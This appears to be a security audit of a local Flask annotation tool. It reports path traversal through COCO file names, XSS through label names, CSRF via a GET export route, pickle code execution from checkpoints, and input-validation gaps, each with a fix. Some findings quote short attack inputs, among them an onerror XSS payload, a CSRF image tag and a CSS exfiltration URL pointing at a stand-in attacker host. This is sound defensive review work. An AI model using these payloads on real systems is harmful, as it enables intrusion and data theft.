# Security Review -- Insegment (2026-04-21)

## Threat Model

Insegment is a single-user Flask + Canvas desktop tool. `app.run(host="0.0.0.0", port=5000, debug=False)` (`cli.py:114`) is invoked without authentication, which means **anything on the LAN that can reach port 5000 can drive the API** -- that is a notable deviation from the "localhost-only" intent stated in the project description. For this review, the realistic attackers are:

- **(a) Local processes / other users on the same machine.** Any process that can open a socket to `127.0.0.1:5000` (or any host on the same LAN if the user is on an open network) can call every API without credentials.
- **(b) Untrusted file content** Sergio loads: a COCO JSON with attacker-controlled `file_name` fields, a model checkpoint (`--checkpoint foo.pth`), or a model adapter module. These are the highest-value attack surface because they travel well (shared datasets, lab drives, downloads).
- **(c) A browser page Sergio happens to have open while the tool is running.** DNS-rebinding + no CORS/auth means a hostile website could in principle hit the API. Low-probability but present because CSRF protection is absent and `host=0.0.0.0`.

No authN/authZ, no CSRF token, no CORS policy, no input size limits. The tool trusts its input fully; findings below are ranked against what a misused input or a careless load can actually do.

## Findings

### F-01: Path traversal in `/api/semiannotation/scan` via COCO `file_name` -- Severity: Medium
**Location:** `src/insegment/routes_semiannotation.py:87-96` and `src/insegment/utils.py:80-89`
**Issue:** After parsing a COCO JSON, the code builds `png_path = folder_path / img["file_name"]` with no sanitization, then stores `name = img["file_name"].replace(".png", "")` as the frame key. A malicious `file_name` like `"../../Users/sergi/secret.png"` resolves outside `folder_path`. The resulting entry is stored in `STATE["semiannotation_frames"]` and subsequently used in:
- `routes_semiannotation.py:213` -- `send_file(png_path)` reads that path and serves it to the browser (**arbitrary file read** of anything Sergio can read, restricted to `.png` MIME but the file contents are returned raw).
- `routes_semiannotation.py:129` -- `corrected_path = Path(STATE["output_dir"]) / f"{frame_key}_annotations.json"`. Because `frame_key` came from `img["file_name"].replace(".png", "")`, it can contain `..` and OS separators. The Path join then escapes `output_dir` for the *read* side.
- The frontend URL `<frame_key>` Flask converter blocks `/`, which prevents direct traversal via URL. But `/api/semiannotation/infer/<frame_key>` uses `urllib`-decoded paths and `frames[frame_key]` is already poisoned at scan time -- the browser can iterate keys via `/api/semiannotation/list` (line 22-26), then call `/api/semiannotation/frame/<frame_key>` after URL-encoding the separators (e.g. `%5C` on Windows). `send_file` in Flask then resolves the absolute `png_path` stored in the dict, bypassing the URL-level block.

**Impact:** A single-file dataset download (an untrusted `_annotations.coco.json`) can leak any file Sergio's user account can read the moment he scans the folder and the UI renders the frames list. Under the threat model that's realistic -- the whole semi-annotation workflow is designed around loading third-party COCO folders.

**Fix:** In both `routes_semiannotation.py:88` and `utils.py:81`, reject `img["file_name"]` entries that contain `..`, `/`, `\\`, or are absolute, before touching the filesystem. Minimum patch:
```python
fn = img["file_name"]
if ("/" in fn) or ("\\" in fn) or ".." in Path(fn).parts or Path(fn).is_absolute():
    logger.warning("Skipping suspicious file_name: %r", fn)
    continue
png_path = folder_path / fn
# optional defense in depth: after join, verify png_path.resolve() is inside folder_path.resolve()
```
Apply the same check in `utils.py:_load_semiannotation_dir`.

### F-02: Unsafe `Path(folder)` from request body in `/api/semiannotation/scan` -- Severity: Low
**Location:** `src/insegment/routes_semiannotation.py:61-66`
**Issue:** `folder = data.get("folder", "").strip().strip('"').strip("'")` then `Path(folder)` with no sandboxing. The existence check at line 65 allows any absolute path the Flask process can `stat`. Combined with F-01, an attacker who can POST to `/api/semiannotation/scan` can point the scan at any readable directory that contains a COCO-shaped JSON.
**Impact:** In the local/LAN threat model, this is an open directory-listing primitive for the Insegment process (enumerate any `.json` in a directory, read PNGs in it). Real impact requires a malicious COCO JSON in that directory -- i.e. it's a building block, not a standalone exploit.
**Fix:** This is semi-intentional (the user *chooses* the folder). Two tightenings worth making:
1. Reject non-local paths. Since the whole app is local-only, refuse UNC (`\\server\share`) and `http://` / `file://` shapes early.
2. Don't leak the resolved absolute path back in the error string at line 66 (low-value log-injection-ish concern; the user provided it anyway).

### F-03: XSS via unescaped class name in `renderStatsPanel` -- Severity: Medium
**Location:** `src/insegment/templates/index.html:1497`
**Issue:** `row.innerHTML = `<span class="stat-label">${cfg.name}:</span><span class="stat-value" id="stat-class-${id}" style="color:${cfg.color};">-</span>`;` -- both `cfg.name` and `cfg.color` are injected into HTML without escaping. `cfg.name` comes from `/api/labels` which echoes whatever was POSTed to `/api/labels/rename` or `/api/labels/add`. Anything on the LAN can POST a class name like `<img src=x onerror=fetch('/api/labels/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'evil'})})>` and when Sergio next renders the stats panel, script runs in his origin. Same origin means full API access.
**Impact:** XSS in a same-origin page that controls the whole annotation pipeline. Under the stated threat model (LAN-exposed `host=0.0.0.0`), this is exploitable by anyone on the network. Even under a strict localhost-only model, a browser page visited while Insegment is running could CSRF it (see F-09).
**Fix:** Replace `innerHTML` with DOM construction at `index.html:1496-1498`:
```javascript
const label = document.createElement('span'); label.className = 'stat-label'; label.textContent = cfg.name + ':';
const value = document.createElement('span'); value.className = 'stat-value'; value.id = 'stat-class-' + id;
value.style.color = cfg.color; value.textContent = '-';
row.appendChild(label); row.appendChild(value);
```
This is the only `innerHTML` assignment I found that mixes template strings with server-controlled data -- the other `innerHTML = ''` calls (lines 331, 351, 722, 1465, 1492, 1608, 1655) just clear, and the later populating uses `textContent`/`createElement`.

### F-04: `cli.py --model` loader executes arbitrary module code at import -- Severity: Info (documented risk)
**Location:** `src/insegment/cli.py:44-47`
**Issue:** `module_path, class_name = model_string.rsplit(":", 1); module = importlib.import_module(module_path)`. Any side effects in the target module's top level (or its `__init__.py`) run with full user privileges. This is the documented design -- uvicorn/gunicorn do the same -- but it is worth stating explicitly: the `--model` argument is **arbitrary code execution on the user's machine**. An attacker who can set CLI args, drop a Python file on `sys.path`, or convince Sergio to `pip install` a package can execute code the moment the CLI loads.
**Web-request reachability:** No web route can influence which module is loaded. `load_model_class` is only called in `cmd_serve` (`cli.py:85`) from CLI args. `STATE["segmenter"]` is only replaced via `configure_app`, which is only called from the CLI. Safe on the web side.
**Impact:** Local code execution by definition. Under the threat model, this is acceptable -- Sergio is the one typing the CLI -- but it should be **documented in the README**: "`--model` runs Python code; only use models you trust."
**Fix:** No code change. Add a one-line note to the README / `insegment serve --help` string warning the user. Optionally validate that the module path contains only `[A-Za-z0-9_.]` to surface typos faster, but this is not a real security control.

### F-05: Untrusted `--checkpoint` is `torch.load`-ed downstream (pickle RCE) -- Severity: Medium (for BacDETRSegmenter adapter)
**Location:** `src/insegment/models/bacdetr.py:62-75` -> `HiTMicTools.model_components.scsegmenter.ScSegmenter(model_path=ckpt, ...)`
**Issue:** The adapter forwards `checkpoint_path` to `ScSegmenter`, which (per its documented API) calls `torch.load()` on it. `torch.load` defaults to `weights_only=False` up through PyTorch 2.3, meaning the checkpoint is **unpickled** -- this is full arbitrary Python code execution the moment the model loads. A `.pth` file from a teammate, HuggingFace mirror, or Google Drive can contain a `__reduce__` payload that runs anything.
**Impact:** Real. "I got this checkpoint from someone" is the normal mode of operation for ML researchers. This is the single most likely vector for Sergio getting popped.
**Fix:** Two options, in order of preference:
1. **Upgrade PyTorch to >= 2.4 and pass `weights_only=True`** inside `ScSegmenter` (upstream change in HiTMicTools, not in this repo). That blocks unpickle gadgets. If you can't upstream it, document the risk prominently.
2. **At minimum**, in the README / CLI help, add: "Only load `--checkpoint` files you produced yourself or trust completely. Model checkpoints are Python pickle files and can execute arbitrary code."

Not an Insegment bug, but it is the most important thing to flag to the user because it's high-impact and easy to fall for.

### F-06: `/api/restore` stores arbitrary JSON in STATE with no validation -- Severity: Low
**Location:** `src/insegment/routes_export.py:144-161`
**Issue:** `annotations = data.get("annotations", [])` is assigned verbatim into `STATE["annotations"][index]["annotations"]`. No type check, no schema, no bbox validation. If an entry lacks `"id"`, the `max((a["id"] for a in annotations), default=-1)` at line 158 raises `KeyError` -> 500. If a non-list is passed, downstream routes that iterate `annotations` crash. Most problematically, if the user then calls `/api/autosave`, the malformed data is serialized to disk via `_build_coco_dict` -> `export_coco`. If `export_coco` doesn't tolerate missing keys, autosave crashes. If it does tolerate them (and silently writes an incomplete COCO), the saved file is corrupt but survives.
**Impact:** Local DoS / data corruption. Not an escape, not a write outside `output_dir`. Under the threat model: an attacker on the LAN could POST a malformed body and corrupt Sergio's autosave for that image. Mild annoyance, not catastrophic.
**Fix:** At `routes_export.py:151`, validate:
```python
if not isinstance(annotations, list):
    return jsonify({"error": "annotations must be a list"}), 400
for a in annotations:
    if not isinstance(a, dict) or "id" not in a or not isinstance(a["id"], int):
        return jsonify({"error": "each annotation needs an integer 'id'"}), 400
    # Optional: require bbox, segmentation, category_id with type checks
```

### F-07: `/api/add` and `/api/add_polygon` 500 on non-int `index` -- Severity: Low
**Location:** `src/insegment/routes_annotations.py:34, 107`
**Issue:** `if index not in STATE["annotations"]` uses `index` (from JSON body) as a dict key. If the caller sends `"index": {}` or `"index": []`, `in` raises `TypeError: unhashable type` -> Flask 500. If they send `"index": "5"` (a string), it won't match int key `5` and the route returns a confusing 400 "No annotations loaded for this image" even though the image IS loaded.
**Impact:** 500 instead of 400. Minor. No security boundary crossed. Clutters logs.
**Fix:** Add a type check right after `require_fields` at `routes_annotations.py:27-33` and `80-82`:
```python
if not isinstance(index, int) or isinstance(index, bool):
    return jsonify({"error": "'index' must be an integer"}), 400
```
Same treatment for `x`/`y` (should be `int` or `float`), and `class_id` / `shape`. While you're at it, extend `require_fields` to take an optional `types` map -- see the fix for F-08 for a consolidated form.

### F-08: Several routes 500 on missing STATE keys instead of returning a clean error -- Severity: Low
**Location:** multiple -- e.g. `routes_export.py:43` assumes `STATE["output_dir"]` is set (it is, by `configure_app`, but only if `configure_app` was called). If someone imports `app` without calling `configure_app`, `Path(STATE["output_dir"])` passes `None` to `Path` -> TypeError. `routes_images.py:73` does `STATE["images"][index]["filename"]` after the bounds check at line 61, that one is fine. `routes_inference.py:70` does `STATE["images"][index]["filename"]` without bounds-check (line 89 has it, so OK). `routes_tiles.py:36-47` reads `ann_data["annotations"]` with no existence check for the `annotations` key (always present because of line 19, OK).

The realistic gap is only `output_dir` being `None` when export/autosave is called before `configure_app` runs -- which doesn't happen via the CLI, but might via tests or embedding. This is not exploitable, just brittle.
**Impact:** Dev-experience, not security.
**Fix:** In `app.py:configure_app`, line 79, already defaults `output_dir` to `"./annotations_output"`, so this is fine unless someone constructs the app without calling `configure_app`. Consider initializing `STATE["output_dir"] = "./annotations_output"` at `state.py:28` as a safe default so the routes never see `None`.

### F-09: No CSRF / origin check; app binds `0.0.0.0` -- Severity: Low (Medium if you're ever on untrusted Wi-Fi)
**Location:** `src/insegment/cli.py:114` -- `app.run(host="0.0.0.0", port=args.port, debug=False)`
**Issue:** `0.0.0.0` means the server listens on every network interface, not just loopback. On an untrusted LAN (lab Wi-Fi, conference, coffee shop), any device on the network reaches the full API. No auth, no CSRF token, no CORS policy. Combined with F-03 (XSS), a hostile page in a browser could drive the API via `fetch` -- most routes accept JSON and don't require any preflight-triggering header beyond `Content-Type: application/json`, which does trigger CORS preflight and would fail without an explicit `Access-Control-Allow-Origin`, so CSRF via `fetch` is actually mostly blocked by the browser's SOP. But GETs (including `/api/export/<int>` which *writes files*) have no CSRF protection -- a `<img src="http://localhost:5000/api/export/0?format=coco">` on any page Sergio visits triggers an export write.
**Impact:** On a private network, near-zero. On shared Wi-Fi, real. `/api/export/<int>` writing via a GET is the standout: GETs should be idempotent and shouldn't write to disk. An attacker page can spam exports.
**Fix (pick one, increasing rigor):**
1. `app.run(host="127.0.0.1", ...)` in `cli.py:114`. Add `--host` flag for users who actually want LAN access. Biggest single-line risk reduction in this codebase.
2. Change `/api/export/<int>` at `routes_export.py:19` from GET to POST. Makes it non-CSRF-able by simple `<img>` tags.
3. Add an origin/referer check middleware that rejects cross-origin requests.

### F-10: SSE job IDs are 32-bit (uuid4()[:8]) -- Severity: Info
**Location:** `src/insegment/routes_inference.py:96`
**Issue:** `job_id = str(uuid.uuid4())[:8]` truncates a 128-bit UUID to 32 bits (8 hex chars). Under the single-user threat model, fine -- but an attacker who can reach the network could poll `/api/inference/progress/<id>` with random IDs and with 2^32 = 4B keyspace, at realistic rates (say 1000 req/s) they'd hit a live job only with hours of effort per job. **Not** a practical attack. Progress events don't leak much beyond "loading image" / "running inference" / final detection count.
**Impact:** Theoretical. Mentioned only because it's technically a weakening of UUIDs.
**Fix:** Use the full UUID: `job_id = str(uuid.uuid4())`. One character changed, defense in depth.

### F-11: Color field from `/api/labels/color` is unvalidated, rendered in `style="color:${cfg.color}"` -- Severity: Low
**Location:** `src/insegment/routes_labels.py:127-137`, `src/insegment/templates/index.html:1497`
**Issue:** `/api/labels/color` takes `data["color"]` and stores it verbatim. Later it's interpolated into `style="color:${cfg.color};"`. If `cfg.color` is `red;background:url(javascript:alert(1))` that's a CSS-injection vector in IE/old browsers. In modern Chrome/Firefox, `javascript:` URLs are blocked in `style` attributes, but CSS injection can still leak data via `background-image: url("http://attacker/?exfil=...")`. Combined with F-03 the XSS is already simpler, but this is a distinct vector.
**Impact:** Low. Also an XSS-adjacent bug; fixed by the same treatment as F-03 plus server-side validation.
**Fix:** At `routes_labels.py:131`, validate: `if not re.fullmatch(r"#[0-9a-fA-F]{6}", color): return jsonify({"error": "color must be #RRGGBB"}), 400`. Apply the same at `api_labels_add` (`routes_labels.py:73`).

## Non-findings (reviewed and dismissed)

- **Path traversal via image filenames stored as `f.stem`** (`utils.py:55`, `inference_core.py:31`, `routes_export.py:48`) -- `Path.iterdir()` cannot yield a name containing `/` or `\\` on any real filesystem. The worst realistic stem is `".."` (from a `...hidden.png`-style filename), and `f"{stem}_annotations.json"` always appends a suffix, so the final filename is literally `".._annotations.json"` inside `output_dir`. No escape. Verified experimentally.
- **Path traversal via Flask URL converters** -- `/api/semiannotation/load/<frame_key>` and friends use Flask's default `<string>` converter, which rejects `/`. Confirmed with a Flask test client. The `<int:...>` converter for `/api/image/<int:index>` etc. rejects everything non-numeric. So URL-level traversal is blocked. (The data-level traversal via COCO `file_name` in F-01 is the remaining issue.)
- **Bounds-check consistency on index routes** -- All `<int:index>` routes I reviewed either bounds-check explicitly (`routes_images.py:61`, `routes_inference.py:31, 89`) or look up in a dict with a 400 on miss (`routes_annotations.py:34, 107, 134, 152`; `routes_export.py:34, 93, 153, 167`; `routes_tiles.py:19`). `load_image` at `utils.py:102-104` returns `None` on out-of-range. No IndexError path found. **Exception**: `routes_inference.py:70` does `STATE["images"][index]["filename"]` inside the `force=1` branch *after* the bounds check at line 31, which is OK.
- **`/api/add` list-of-pairs polygon confusion** -- already fixed in a previous PR. The validation at `routes_annotations.py:89-103` correctly rejects `[[x,y],[x,y]]`.
- **`tkinter` folder pickers** (`routes_images.py:91-102`, `routes_semiannotation.py:36-47`) -- the picker path is user-driven from the OS dialog, not request-controlled. No traversal from the web, regardless of what the OS dialog returns.
- **SQL injection** -- no SQL anywhere. Confirmed with grep: no `sqlite`, no `execute`, no `cursor`.
- **Log injection** -- logging uses `%s` parameterized format throughout (`logger.info("Loaded %d images from %s", ...)`). Filenames and user input flow in as args, not concatenated into the format string. Safe.
- **`_inference_jobs` dict memory leak** -- the `done`/`error` branches pop the job. The `except queue.Empty` heartbeat branch never pops, so a disconnected SSE client leaves the job in `_inference_jobs` forever (bounded by the thread's `q.put` eventually landing in the dead queue which gets popped on first matching event). Worth a note but not a security issue.
- **`export_coco`/`export_*` file-write safety** -- all writes go to `Path(STATE["output_dir"]) / f"{file_label}_{suffix}"`. `file_label` is `f.stem` which cannot contain separators (see first bullet). Output dir is controlled by the CLI, not by the web. Safe.
- **`/api/labels/rename` arbitrary new_name** -- accepts any Unicode string. Feeds back via `/api/labels` and into the XSS at F-03, which is the real issue. Not a separate bug.
- **PIL decompression bomb on `Image.open`** -- `load_image` at `utils.py:96-112` uses PIL with no `MAX_IMAGE_PIXELS` override. A malicious multi-gigapixel image in a scanned folder could trigger PIL's `DecompressionBombError` (which is raised by default above ~178 megapixels). That's a 500, not a crash of the process, and the attacker needs to drop a file into the scanned directory which is already trust-boundary-inside. Info-only.

## Priority Fix Order

1. **F-05** (torch.load on untrusted checkpoints) -- document in README today. Biggest real-world hit.
2. **F-01** (semiannotation path traversal via COCO file_name) -- 10-line patch in `routes_semiannotation.py:88` and `utils.py:81`.
3. **F-03** (XSS via class name in innerHTML) -- rewrite one line at `index.html:1497`. 
4. **F-09** (bind to 127.0.0.1 instead of 0.0.0.0) -- one-line change in `cli.py:114`; adds `--host` flag.
5. **F-06** / **F-07** / **F-11** (input validation) -- batch these into one PR with a helper that validates types and color format.
6. **F-04** / **F-10** -- documentation / defense-in-depth, low urgency.
